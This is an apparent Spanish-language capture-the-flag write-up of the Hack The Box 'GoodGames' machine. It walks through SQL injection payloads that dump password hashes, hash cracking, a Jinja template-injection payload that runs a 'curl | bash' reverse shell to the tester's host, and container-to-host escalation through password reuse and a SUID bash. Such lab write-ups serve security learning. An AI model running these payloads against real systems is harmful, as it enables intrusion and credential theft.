---
layout: post
title: GoodGames
date: 2023-03-21
description:
img:
fig-caption:
tags: [eJPT, eWPT, eCPPTv2, OSCP (Escalada)]
---
___

<center><img src="/writeups/assets/img/Goodgames-htb/GoodGames.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Inyección SQL - Error Based

* Reutilización de Credenciales

* Pivoting

* SSTI

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.130 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-21 08:58 GMT
Nmap scan report for 10.10.11.130
Host is up (0.088s latency).
Not shown: 60593 closed tcp ports (reset), 4941 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 20.18 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p80 10.10.11.130 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-21 08:59 GMT
Nmap scan report for 10.10.11.130
Host is up (0.040s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
Service Info: Host: goodgames.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.95 seconds
```

Agrego el dominio ```goodgames.htb``` al ```/etc/hosts```

## Puerto 80 (HTTP)

Con ```whatweb```, analizo las tecnologías que está empleando el servidor web

La página principal se ve así:

<img src="/writeups/assets/img/Goodgames-htb/1.png" alt="">

Tengo acceso a un panel de inicio de sesión

<img src="/writeups/assets/img/Goodgames-htb/2.png" alt="">

Y a otro de registro

<img src="/writeups/assets/img/Goodgames-htb/3.png" alt="">

Creo una cuenta. Al iniciar sesión, mi nombre se ve reflejado en un mensaje de bienvenida

<img src="/writeups/assets/img/Goodgames-htb/4.png" alt="">

Pruebo una inyección SQL en el panel de inicio de sesión

```null
email=test@test.com' or 1=1-- -&password=rubbx
```

Es vulnerable

```null
<h2 class="h4">Welcome adminrubbx</h2>
```

Aparezco loggeado como el Administrador

<img src="/writeups/assets/img/Goodgames-htb/5.png" alt="">

En la esquina superior derecha, se puede ver un panel de configuración, pero apunta a otro subdominio. Lo añado al ```/etc/hosts```

```null
http://internal-administration.goodgames.htb/
```

Una vez carga se ve así:

<img src="/writeups/assets/img/Goodgames-htb/6.png" alt="">

Vuelvo a la inyección SQL, para dumpear los datos, en total hay 4 columnas

```null
email=test@test.com' order by 4-- -&password=rubbx
```

Las selecciono

```null
email=test@test.com' union select 1,2,3,4-- -&password=rubbx
```

El 4 se ve reflejado en la respuesta

```null
<h2 class="h4">Welcome 4</h2>
```

Enumero todas las bases de datos

```null
email=test@test.com' union select 1,2,3,group_concat(schema_name) from information_schema.schemata-- -&password=rubbx
```

```null
<h2 class="h4">Welcome information_schema,main</h2>
```

Y las tablas

```null
email=test@test.com' union select 1,2,3,group_concat(table_name) from information_schema.tables-- -&password=rubbx
```

```null
email=test@test.com' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema="main"-- -&password=rubbx
```

```null
email=test@test.com' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema="main" and table_name="user"-- -&password=rubbx
```

```null
<h2 class="h4">Welcome email,id,name,password</h2>
```

Dumpeo los hashes

```null
email=test@test.com' union select 1,2,3,group_concat(email,":",password) from main.user-- -&password=rubbx
```

```null
<h2 class="h4">Welcome admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec,rubbx@rubbx.com:f6ad19fffa579c959ced6ba4aa870d7f</h2>
```

La crackeo con ```john```

```null
john -w:/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=12
Press 'q' or Ctrl-C to abort, almost any other key for status
superadministrator (admin@goodgames.htb)     
1g 0:00:00:00 DONE (2023-03-21 09:50) 6.666g/s 23175Kp/s 23175Kc/s 23175KC/s superare1000..super5b
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Puedo iniciar sesión en ```http://internal-administration.goodgames.htb/index```

<img src="/writeups/assets/img/Goodgames-htb/7.png" alt="">

La sección del perfil es vulnerable a SSTI

<img src="/writeups/assets/img/Goodgames-htb/8.png" alt="">

<img src="/writeups/assets/img/Goodgames-htb/9.png" alt="">


Es posible llegar a inyectar comandos

{%raw%}
```null
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
{%endraw%}

<img src="/writeups/assets/img/Goodgames-htb/10.png" alt="">

Creo un archivo ```index.html``` que se encarge de enviarme una reverse shell, para compartirlo con un servicio HTTP con python y cargarlo en una bash

```null
#!/bin/bash

bash -i >& /dev/tcp/10.10.16.4/443 0>&1
```

{%raw%}
```null
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl 10.10.16.4 | bash').read() }}
```
{%endraw%}


Gano acceso al sistema

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.11.130] 42266
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3a453ab39d3d:/backend# script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
root@3a453ab39d3d:/backend# ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
root@3a453ab39d3d:/backend# export TERM=xterm
root@3a453ab39d3d:/backend# export SHELL=bash
root@3a453ab39d3d:/backend# stty rows 55 columns 209
```

Estoy dentro de un contenedor

```null
root@3a453ab39d3d:/backend# hostname -I
172.19.0.2 
```

Puedo ver la primera flag

```null
root@3a453ab39d3d:/home/augustus# cat user.txt 
89f832d05f32fdc2224099192654bdc8
```

# Escalada

El directorio personal de este usuario es una montura

```null
root@3a453ab39d3d:/home/augustus# df -h
Filesystem      Size  Used Avail Use% Mounted on
overlay         6.3G  5.0G  991M  84% /
tmpfs            64M     0   64M   0% /dev
tmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup
/dev/sda1       6.3G  5.0G  991M  84% /home/augustus
shm              64M     0   64M   0% /dev/shm
tmpfs           2.0G     0  2.0G   0% /proc/acpi
tmpfs           2.0G     0  2.0G   0% /sys/firmware
```

Subo un binario estático de ```nmap``` para aplicar HostDiscovery

```null
root@3a453ab39d3d:/tmp# ./nmap -p- --open --min-rate 5000 -sn 172.19.0.1/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-21 10:03 UTC
You cannot use -F (fast scan) or -p (explicit port selection) when not doing a port scan
QUITTING!
root@3a453ab39d3d:/tmp# ./nmap --min-rate 5000 -sn 172.19.0.1/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-21 10:03 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.19.0.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000062s latency).
MAC Address: 02:42:D3:53:27:44 (Unknown)
Nmap scan report for 3a453ab39d3d (172.19.0.2)
Host is up.
Nmap done: 256 IP addresses (2 hosts up) scanned in 13.37 seconds
```

Escaneo los puertos

```null
root@3a453ab39d3d:/tmp# ./nmap -p- --open --min-rate 5000 -n -Pn 172.19.0.1

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-21 10:08 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.19.0.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000020s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:D3:53:27:44 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 22.42 seconds
```

La contraseña de antes se reutiliza por SSH

```null
root@3a453ab39d3d:/tmp# ssh augustus@172.19.0.1
The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
augustus@GoodGames:~$ 
```

Tengo acceso a otro nuevo segmento

```null
augustus@GoodGames:~$ hostname -I
10.10.11.130 172.19.0.1 172.17.0.1 dead:beef::250:56ff:feb9:c879 
```

Tiene otros varios puertos internos abiertos. Muechos de ellos son páginas web

```null
augustus@GoodGames:/tmp$ ss -nlpt
State                       Recv-Q                      Send-Q                                            Local Address:Port                                              Peer Address:Port                      
LISTEN                      0                           128                                                   127.0.0.1:8000                                                   0.0.0.0:*                         
LISTEN                      0                           70                                                    127.0.0.1:33060                                                  0.0.0.0:*                         
LISTEN                      0                           128                                                   127.0.0.1:3306                                                   0.0.0.0:*                         
LISTEN                      0                           128                                                   127.0.0.1:8085                                                   0.0.0.0:*                         
LISTEN                      0                           128                                                  172.19.0.1:22                                                     0.0.0.0:*                         
LISTEN                      0                           128                                                           *:80                                                           *:*      
```

Abuso de la montura ya existente para crear una ```bash``` SUID y al volverme a conectar a la máquina real ejecutarla

```null
augustus@GoodGames:~$ cp /bin/bash .
augustus@GoodGames:~$ exit
logout
Connection to 172.19.0.1 closed.
root@3a453ab39d3d:/tmp# cd /home/augustus/
root@3a453ab39d3d:/home/augustus# chmod u+s bash
root@3a453ab39d3d:/home/augustus# chown root:root bash
root@3a453ab39d3d:/home/augustus# ssh augustus@172.19.0.1
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Mar 21 10:25:35 2023 from 172.19.0.2
augustus@GoodGames:~$ ./bash -p
bash-5.1# cat /root/root.txt
068ab917361d3f06a32bd05d5ad85a17
bash-5.1# 
```